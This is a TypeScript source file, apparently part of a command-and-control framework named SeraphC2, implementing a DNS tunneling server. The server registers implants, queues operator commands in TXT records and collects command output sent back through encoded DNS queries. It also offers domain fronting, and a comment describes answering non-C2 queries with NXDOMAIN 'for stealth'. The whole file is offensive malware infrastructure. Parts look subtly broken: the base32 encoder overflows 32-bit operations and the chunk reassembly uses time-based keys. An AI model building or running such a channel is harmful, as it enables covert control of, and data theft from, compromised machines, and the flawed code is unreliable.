/**
 * DNS tunneling protocol handler with TXT record encoding
 * Implements requirements 1.3, 1.4, and 7.9 from the SeraphC2 specification
 */

import { createSocket, Socket as UDPSocket } from 'dgram';
import { BaseProtocolHandler, ProtocolMessage, ProtocolConfig, ConnectionInfo } from './interfaces';
import { Protocol } from '../types/entities';
import { Logger } from '../utils/logger';

export interface DNSConfig extends ProtocolConfig {
  domain: string;
  subdomains: {
    command: string;
    response: string;
    heartbeat: string;
    registration: string;
  };
  maxTxtRecordLength: number;
  chunkSize: number;
  compressionEnabled: boolean;
  domainFronting?: {
    enabled: boolean;
    frontDomain: string;
    realDomain: string;
  };
}

export interface DNSQuery {
  id: number;
  name: string;
  type: number;
  class: number;
}

export interface DNSResponse {
  id: number;
  flags: number;
  questions: DNSQuery[];
  answers: DNSAnswer[];
  authorities: DNSAnswer[];
  additionals: DNSAnswer[];
}

export interface DNSAnswer {
  name: string;
  type: number;
  class: number;
  ttl: number;
  data: string;
}

export interface ImplantDNSSession {
  implantId: string;
  lastQuery: Date;
  queryCount: number;
  connectionInfo: ConnectionInfo;
  pendingMessages: ProtocolMessage[];
}

export class DNSHandler extends BaseProtocolHandler {
  private server: UDPSocket | null = null;
  private implantSessions: Map<string, ImplantDNSSession>;
  private logger: Logger;
  private dnsConfig: DNSConfig;
  private messageChunks: Map<string, Map<number, string>>; // messageId -> chunkIndex -> data

  constructor(config: DNSConfig) {
    super(Protocol.DNS, config);
    this.implantSessions = new Map();
    this.logger = Logger.getInstance();
    this.dnsConfig = config;
    this.messageChunks = new Map();
  }

  /**
   * Start DNS server
   */
  async start(): Promise<void> {
    if (this.isRunning) {
      throw new Error('DNS handler is already running');
    }

    try {
      this.logger.info('Starting DNS protocol handler', {
        port: this.dnsConfig.port || 53,
        domain: this.dnsConfig.domain,
      });

      this.server = createSocket('udp4');
      this.setupEventHandlers();

      await new Promise<void>((resolve, reject) => {
        this.server!.bind(
          this.dnsConfig.port || 53,
          this.dnsConfig.host || '0.0.0.0',
          (error?: Error) => {
            if (error) {
              reject(error);
            } else {
              resolve();
            }
          }
        );
      });

      this.isRunning = true;

      this.logger.info('DNS protocol handler started successfully');
      this.emit('started');
    } catch (error) {
      this.logger.error('Failed to start DNS handler', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      throw error;
    }
  }

  /**
   * Stop DNS server
   */
  async stop(): Promise<void> {
    if (!this.isRunning) {
      return;
    }

    try {
      this.logger.info('Stopping DNS protocol handler');

      if (this.server) {
        await new Promise<void>(resolve => {
          this.server!.close(() => {
            resolve();
          });
        });
        this.server = null;
      }

      this.implantSessions.clear();
      this.messageChunks.clear();
      this.isRunning = false;

      this.logger.info('DNS protocol handler stopped');
      this.emit('stopped');
    } catch (error) {
      this.logger.error('Failed to stop DNS handler', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      throw error;
    }
  }

  /**
   * Send message to specific implant via DNS TXT records
   */
  async sendMessage(implantId: string, message: ProtocolMessage): Promise<boolean> {
    try {
      const session = this.implantSessions.get(implantId);
      if (!session) {
        this.logger.warn('Implant session not found for DNS message', { implantId });
        return false;
      }

      // Apply jitter before processing
      await this.applyJitter();

      // Queue message for next DNS query from implant
      session.pendingMessages.push(message);

      this.updateStats({
        messagesSent: this.stats.messagesSent + 1,
        bytesSent: this.stats.bytesSent + JSON.stringify(message).length,
      });

      this.logger.debug('Message queued for DNS delivery', {
        implantId,
        messageId: message.id,
        type: message.type,
        queueSize: session.pendingMessages.length,
      });

      return true;
    } catch (error) {
      this.logger.error('Failed to send DNS message', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        messageId: message.id,
      });

      this.updateStats({
        errors: this.stats.errors + 1,
      });

      return false;
    }
  }

  /**
   * Get connection info for implant
   */
  getConnectionInfo(implantId: string): ConnectionInfo | null {
    const session = this.implantSessions.get(implantId);
    return session ? session.connectionInfo : null;
  }

  /**
   * Check if implant is connected (has recent DNS activity)
   */
  isImplantConnected(implantId: string): boolean {
    const session = this.implantSessions.get(implantId);
    if (!session) {
      return false;
    }

    // Consider implant connected if last query was within timeout period
    const timeout = this.dnsConfig.timeout || 300000; // 5 minutes default
    const timeSinceLastQuery = Date.now() - session.lastQuery.getTime();

    return timeSinceLastQuery < timeout;
  }

  /**
   * Setup DNS server event handlers
   */
  private setupEventHandlers(): void {
    if (!this.server) return;

    this.server.on('message', async (msg: Buffer, rinfo: any) => {
      try {
        await this.handleDNSQuery(msg, rinfo);
      } catch (error) {
        this.logger.error('Failed to handle DNS query', {
          error: error instanceof Error ? error.message : 'Unknown error',
          remoteAddress: `${rinfo.address}:${rinfo.port}`,
        });

        this.updateStats({
          errors: this.stats.errors + 1,
        });
      }
    });

    this.server.on('error', (error: Error) => {
      this.logger.error('DNS server error', {
        error: error.message,
      });

      this.updateStats({
        errors: this.stats.errors + 1,
      });

      this.emit('serverError', {
        error: error.message,
      });
    });

    this.server.on('listening', () => {
      const address = this.server!.address();
      this.logger.info('DNS server listening', {
        address: address,
      });
    });
  }

  /**
   * Handle incoming DNS query
   */
  private async handleDNSQuery(msg: Buffer, rinfo: any): Promise<void> {
    try {
      const query = this.parseDNSQuery(msg);

      this.logger.debug('DNS query received', {
        queryName: query.name,
        queryType: query.type,
        remoteAddress: `${rinfo.address}:${rinfo.port}`,
      });

      // Check if this is a C2 domain query
      if (!this.isC2Domain(query.name)) {
        // Forward to upstream DNS or return NXDOMAIN
        await this.handleNonC2Query(query, msg, rinfo);
        return;
      }

      // Extract implant information from subdomain
      const implantInfo = this.extractImplantInfo(query.name);
      if (!implantInfo) {
        await this.sendDNSError(query, msg, rinfo);
        return;
      }

      // Update or create implant session
      await this.updateImplantSession(implantInfo, rinfo);

      // Handle different query types
      switch (implantInfo.queryType) {
        case 'registration':
          await this.handleRegistrationQuery(implantInfo, query, msg, rinfo);
          break;
        case 'heartbeat':
          await this.handleHeartbeatQuery(implantInfo, query, msg, rinfo);
          break;
        case 'command':
          await this.handleCommandQuery(implantInfo, query, msg, rinfo);
          break;
        case 'response':
          await this.handleResponseQuery(implantInfo, query, msg, rinfo);
          break;
        default:
          await this.sendDNSError(query, msg, rinfo);
      }

      this.updateStats({
        messagesReceived: this.stats.messagesReceived + 1,
        bytesReceived: this.stats.bytesReceived + msg.length,
      });
    } catch (error) {
      this.logger.error('Failed to handle DNS query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        remoteAddress: `${rinfo.address}:${rinfo.port}`,
      });
      throw error;
    }
  }

  /**
   * Parse DNS query from buffer
   */
  private parseDNSQuery(msg: Buffer): DNSQuery {
    // Simple DNS query parsing - in production, use a proper DNS library
    const id = msg.readUInt16BE(0);
    // const flags = msg.readUInt16BE(2);
    // const qdcount = msg.readUInt16BE(4);

    let offset = 12; // Skip header
    let name = '';

    // Parse query name
    while (offset < msg.length) {
      const length = msg.readUInt8(offset);
      if (length === 0) {
        offset++;
        break;
      }

      if (name.length > 0) {
        name += '.';
      }

      name += msg.toString('utf8', offset + 1, offset + 1 + length);
      offset += length + 1;
    }

    const type = msg.readUInt16BE(offset);
    const qclass = msg.readUInt16BE(offset + 2);

    return {
      id,
      name,
      type,
      class: qclass,
    };
  }

  /**
   * Check if domain is a C2 domain
   */
  private isC2Domain(queryName: string): boolean {
    return queryName.endsWith(this.dnsConfig.domain);
  }

  /**
   * Extract implant information from DNS query name
   */
  private extractImplantInfo(queryName: string): {
    implantId: string;
    queryType: string;
    data?: string;
    chunkIndex?: number;
    totalChunks?: number;
  } | null {
    try {
      // Expected format: [data].[implantId].[queryType].[domain]
      const parts = queryName.split('.');
      const domainParts = this.dnsConfig.domain.split('.');

      // Remove domain parts from the end
      const relevantParts = parts.slice(0, parts.length - domainParts.length);

      if (relevantParts.length < 2) {
        return null;
      }

      const queryType = relevantParts[relevantParts.length - 1];
      const implantId = relevantParts[relevantParts.length - 2];

      // Check if query type is valid
      const validTypes = Object.values(this.dnsConfig.subdomains);
      if (!queryType || !validTypes.includes(queryType)) {
        return null;
      }

      if (!implantId) {
        return null;
      }

      let data: string | undefined;
      let chunkIndex: number | undefined;
      let totalChunks: number | undefined;

      // Extract data if present
      if (relevantParts.length > 2) {
        const dataParts = relevantParts.slice(0, relevantParts.length - 2);

        // Check for chunked data format: chunk[index]of[total].[data]
        const lastPart = dataParts[dataParts.length - 1];
        if (lastPart) {
          const chunkMatch = lastPart.match(/^chunk(\d+)of(\d+)$/);

          if (chunkMatch && chunkMatch[1] && chunkMatch[2]) {
            chunkIndex = parseInt(chunkMatch[1]);
            totalChunks = parseInt(chunkMatch[2]);
            data = dataParts.slice(0, -1).join('.');
          } else {
            data = dataParts.join('.');
          }
        }

        // Decode base32 data
        if (data) {
          data = this.decodeBase32(data);
        }
      }

      const result: {
        implantId: string;
        queryType: string;
        data?: string;
        chunkIndex?: number;
        totalChunks?: number;
      } = {
        implantId,
        queryType,
      };

      if (data !== undefined) {
        result.data = data;
      }
      if (chunkIndex !== undefined) {
        result.chunkIndex = chunkIndex;
      }
      if (totalChunks !== undefined) {
        result.totalChunks = totalChunks;
      }

      return result;
    } catch (error) {
      this.logger.error('Failed to extract implant info from DNS query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        queryName,
      });
      return null;
    }
  }

  /**
   * Update or create implant session
   */
  private async updateImplantSession(implantInfo: any, rinfo: any): Promise<void> {
    const { implantId } = implantInfo;

    let session = this.implantSessions.get(implantId);

    if (!session) {
      // Create new session
      session = {
        implantId,
        lastQuery: new Date(),
        queryCount: 0,
        connectionInfo: {
          protocol: Protocol.DNS,
          remoteAddress: `${rinfo.address}:${rinfo.port}`,
          connectedAt: new Date(),
          lastActivity: new Date(),
          isActive: true,
        },
        pendingMessages: [],
      };

      this.implantSessions.set(implantId, session);

      this.updateStats({
        connectionsTotal: this.stats.connectionsTotal + 1,
        connectionsActive: this.stats.connectionsActive + 1,
      });

      this.emit('implantConnected', {
        implantId,
        connectionInfo: session.connectionInfo,
      });
    } else {
      // Update existing session
      session.lastQuery = new Date();
      session.connectionInfo.lastActivity = new Date();
      session.connectionInfo.remoteAddress = `${rinfo.address}:${rinfo.port}`;
    }

    session.queryCount++;
  }

  /**
   * Handle registration query
   */
  private async handleRegistrationQuery(
    implantInfo: any,
    query: DNSQuery,
    msg: Buffer,
    rinfo: any
  ): Promise<void> {
    try {
      if (implantInfo.data) {
        const registrationData = JSON.parse(implantInfo.data);

        this.emit('implantRegistration', {
          implantId: implantInfo.implantId,
          data: registrationData,
          connectionInfo: this.implantSessions.get(implantInfo.implantId)?.connectionInfo,
        });
      }

      // Send acknowledgment response
      const response = this.createDNSResponse(query, ['registration_ack']);
      await this.sendDNSResponse(response, rinfo);
    } catch (error) {
      this.logger.error('Failed to handle registration query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId: implantInfo.implantId,
      });
      await this.sendDNSError(query, msg, rinfo);
    }
  }

  /**
   * Handle heartbeat query
   */
  private async handleHeartbeatQuery(
    implantInfo: any,
    query: DNSQuery,
    msg: Buffer,
    rinfo: any
  ): Promise<void> {
    try {
      const session = this.implantSessions.get(implantInfo.implantId);
      if (!session) {
        await this.sendDNSError(query, msg, rinfo);
        return;
      }

      this.emit('heartbeatReceived', {
        implantId: implantInfo.implantId,
        data: implantInfo.data ? JSON.parse(implantInfo.data) : {},
        connectionInfo: session.connectionInfo,
      });

      // Send pending messages or heartbeat ack
      const txtRecords = [];

      if (session.pendingMessages.length > 0) {
        const message = session.pendingMessages.shift()!;
        const encodedMessage = this.encodeMessageForTXT(message);
        txtRecords.push(...encodedMessage);
      } else {
        txtRecords.push('heartbeat_ack');
      }

      const response = this.createDNSResponse(query, txtRecords);
      await this.sendDNSResponse(response, rinfo);
    } catch (error) {
      this.logger.error('Failed to handle heartbeat query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId: implantInfo.implantId,
      });
      await this.sendDNSError(query, msg, rinfo);
    }
  }

  /**
   * Handle command query (implant requesting commands)
   */
  private async handleCommandQuery(
    implantInfo: any,
    query: DNSQuery,
    msg: Buffer,
    rinfo: any
  ): Promise<void> {
    try {
      const session = this.implantSessions.get(implantInfo.implantId);
      if (!session) {
        await this.sendDNSError(query, msg, rinfo);
        return;
      }

      const txtRecords = [];

      if (session.pendingMessages.length > 0) {
        const message = session.pendingMessages.shift()!;
        const encodedMessage = this.encodeMessageForTXT(message);
        txtRecords.push(...encodedMessage);
      } else {
        txtRecords.push('no_commands');
      }

      const response = this.createDNSResponse(query, txtRecords);
      await this.sendDNSResponse(response, rinfo);
    } catch (error) {
      this.logger.error('Failed to handle command query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId: implantInfo.implantId,
      });
      await this.sendDNSError(query, msg, rinfo);
    }
  }

  /**
   * Handle response query (implant sending command results)
   */
  private async handleResponseQuery(
    implantInfo: any,
    query: DNSQuery,
    msg: Buffer,
    rinfo: any
  ): Promise<void> {
    try {
      if (!implantInfo.data) {
        await this.sendDNSError(query, msg, rinfo);
        return;
      }

      // Handle chunked responses
      if (implantInfo.chunkIndex !== undefined && implantInfo.totalChunks !== undefined) {
        await this.handleChunkedResponse(implantInfo, query, rinfo);
        return;
      }

      // Handle single response
      const responseData = JSON.parse(implantInfo.data);
      const message: ProtocolMessage = responseData;

      this.emit('messageReceived', {
        message,
        connectionInfo: this.implantSessions.get(implantInfo.implantId)?.connectionInfo,
      });

      // Send acknowledgment
      const response = this.createDNSResponse(query, ['response_ack']);
      await this.sendDNSResponse(response, rinfo);
    } catch (error) {
      this.logger.error('Failed to handle response query', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId: implantInfo.implantId,
      });
      await this.sendDNSError(query, msg, rinfo);
    }
  }

  /**
   * Handle chunked response assembly
   */
  private async handleChunkedResponse(
    implantInfo: any,
    query: DNSQuery,
    rinfo: any
  ): Promise<void> {
    const { implantId, data, chunkIndex, totalChunks } = implantInfo;
    const messageId = `${implantId}_${Date.now()}`; // Simple message ID for chunking

    if (!this.messageChunks.has(messageId)) {
      this.messageChunks.set(messageId, new Map());
    }

    const chunks = this.messageChunks.get(messageId)!;
    chunks.set(chunkIndex, data);

    // Check if all chunks received
    if (chunks.size === totalChunks) {
      // Assemble complete message
      let completeData = '';
      for (let i = 0; i < totalChunks; i++) {
        completeData += chunks.get(i) || '';
      }

      try {
        const responseData = JSON.parse(completeData);
        const message: ProtocolMessage = responseData;

        this.emit('messageReceived', {
          message,
          connectionInfo: this.implantSessions.get(implantId)?.connectionInfo,
        });

        // Clean up chunks
        this.messageChunks.delete(messageId);

        // Send acknowledgment
        const response = this.createDNSResponse(query, ['response_complete']);
        await this.sendDNSResponse(response, rinfo);
      } catch (error) {
        this.logger.error('Failed to assemble chunked response', {
          error: error instanceof Error ? error.message : 'Unknown error',
          implantId,
          messageId,
        });
        await this.sendDNSError(query, Buffer.alloc(0), rinfo);
      }
    } else {
      // Send chunk acknowledgment
      const response = this.createDNSResponse(query, [`chunk_${chunkIndex}_ack`]);
      await this.sendDNSResponse(response, rinfo);
    }
  }

  /**
   * Encode message for TXT record transmission
   */
  private encodeMessageForTXT(message: ProtocolMessage): string[] {
    const messageData = JSON.stringify(message);
    const compressed = this.dnsConfig.compressionEnabled
      ? this.compressData(messageData)
      : messageData;
    const encoded = this.encodeBase32(compressed);

    // Split into chunks if necessary
    const maxLength = this.dnsConfig.maxTxtRecordLength || 255;
    const chunks: string[] = [];

    if (encoded.length <= maxLength) {
      chunks.push(encoded);
    } else {
      const chunkSize = maxLength - 20; // Reserve space for chunk metadata
      const totalChunks = Math.ceil(encoded.length / chunkSize);

      for (let i = 0; i < totalChunks; i++) {
        const start = i * chunkSize;
        const end = Math.min(start + chunkSize, encoded.length);
        const chunk = encoded.substring(start, end);
        chunks.push(`${i}:${totalChunks}:${chunk}`);
      }
    }

    return chunks;
  }

  /**
   * Create DNS response
   */
  private createDNSResponse(query: DNSQuery, txtRecords: string[]): DNSResponse {
    const answers: DNSAnswer[] = txtRecords.map(record => ({
      name: query.name,
      type: 16, // TXT record
      class: 1, // IN class
      ttl: 60, // 1 minute TTL
      data: record,
    }));

    return {
      id: query.id,
      flags: 0x8180, // Response, authoritative
      questions: [query],
      answers,
      authorities: [],
      additionals: [],
    };
  }

  /**
   * Send DNS response
   */
  private async sendDNSResponse(response: DNSResponse, rinfo: any): Promise<void> {
    const responseBuffer = this.encodeDNSResponse(response);

    return new Promise((resolve, reject) => {
      this.server!.send(responseBuffer, rinfo.port, rinfo.address, (error: Error | null) => {
        if (error) {
          reject(error);
        } else {
          resolve();
        }
      });
    });
  }

  /**
   * Send DNS error response
   */
  private async sendDNSError(query: DNSQuery, _msg: Buffer, rinfo: any): Promise<void> {
    const errorResponse: DNSResponse = {
      id: query.id,
      flags: 0x8183, // Response, NXDOMAIN
      questions: [query],
      answers: [],
      authorities: [],
      additionals: [],
    };

    await this.sendDNSResponse(errorResponse, rinfo);
  }

  /**
   * Handle non-C2 DNS queries
   */
  private async handleNonC2Query(query: DNSQuery, msg: Buffer, rinfo: any): Promise<void> {
    // For stealth, we can either:
    // 1. Forward to upstream DNS
    // 2. Return NXDOMAIN
    // 3. Return fake response

    // For now, return NXDOMAIN
    await this.sendDNSError(query, msg, rinfo);
  }

  /**
   * Encode DNS response to buffer
   */
  private encodeDNSResponse(response: DNSResponse): Buffer {
    // Simple DNS response encoding - in production, use a proper DNS library
    const buffers: Buffer[] = [];

    // Header
    const header = Buffer.alloc(12);
    header.writeUInt16BE(response.id, 0);
    header.writeUInt16BE(response.flags, 2);
    header.writeUInt16BE(response.questions.length, 4);
    header.writeUInt16BE(response.answers.length, 6);
    header.writeUInt16BE(response.authorities.length, 8);
    header.writeUInt16BE(response.additionals.length, 10);
    buffers.push(header);

    // Questions
    for (const question of response.questions) {
      const nameBuffer = this.encodeDNSName(question.name);
      const questionBuffer = Buffer.alloc(4);
      questionBuffer.writeUInt16BE(question.type, 0);
      questionBuffer.writeUInt16BE(question.class, 2);
      buffers.push(nameBuffer, questionBuffer);
    }

    // Answers
    for (const answer of response.answers) {
      const nameBuffer = this.encodeDNSName(answer.name);
      const answerHeader = Buffer.alloc(10);
      answerHeader.writeUInt16BE(answer.type, 0);
      answerHeader.writeUInt16BE(answer.class, 2);
      answerHeader.writeUInt32BE(answer.ttl, 4);

      const dataBuffer = Buffer.from(answer.data, 'utf8');
      answerHeader.writeUInt16BE(dataBuffer.length + 1, 8); // +1 for length byte

      const lengthByte = Buffer.alloc(1);
      lengthByte.writeUInt8(dataBuffer.length, 0);

      buffers.push(nameBuffer, answerHeader, lengthByte, dataBuffer);
    }

    return Buffer.concat(buffers);
  }

  /**
   * Encode DNS name
   */
  private encodeDNSName(name: string): Buffer {
    const parts = name.split('.');
    const buffers: Buffer[] = [];

    for (const part of parts) {
      if (part.length > 0) {
        const lengthByte = Buffer.alloc(1);
        lengthByte.writeUInt8(part.length, 0);
        const partBuffer = Buffer.from(part, 'utf8');
        buffers.push(lengthByte, partBuffer);
      }
    }

    // Null terminator
    buffers.push(Buffer.alloc(1));

    return Buffer.concat(buffers);
  }

  /**
   * Base32 encoding
   */
  private encodeBase32(data: string): string {
    // Simple base32 encoding - in production, use a proper library
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    const bytes = Buffer.from(data, 'utf8');
    let result = '';

    for (let i = 0; i < bytes.length; i += 5) {
      const chunk = bytes.slice(i, i + 5);
      let value = 0;

      for (let j = 0; j < chunk.length; j++) {
        const byte = chunk[j];
        if (byte !== undefined) {
          value = (value << 8) | byte;
        }
      }

      const padding = 5 - chunk.length;
      value <<= padding * 8;

      for (let j = 0; j < 8 - Math.floor((padding * 8) / 5); j++) {
        result += alphabet[(value >>> (35 - j * 5)) & 0x1f];
      }
    }

    return result.toLowerCase(); // Use lowercase for DNS compatibility
  }

  /**
   * Base32 decoding
   */
  private decodeBase32(data: string): string {
    // Simple base32 decoding - in production, use a proper library
    const alphabet = 'abcdefghijklmnopqrstuvwxyz234567';
    const bytes: number[] = [];

    let value = 0;
    let bits = 0;

    for (const char of data) {
      const index = alphabet.indexOf(char);
      if (index === -1) continue;

      value = (value << 5) | index;
      bits += 5;

      if (bits >= 8) {
        bytes.push((value >>> (bits - 8)) & 0xff);
        bits -= 8;
      }
    }

    return Buffer.from(bytes).toString('utf8');
  }

  /**
   * Compress data (simple implementation)
   */
  private compressData(data: string): string {
    // Simple compression - in production, use zlib or similar
    return data; // Placeholder
  }

  /**
   * Get all connected implants
   */
  getConnectedImplants(): string[] {
    return Array.from(this.implantSessions.keys()).filter(implantId =>
      this.isImplantConnected(implantId)
    );
  }
}
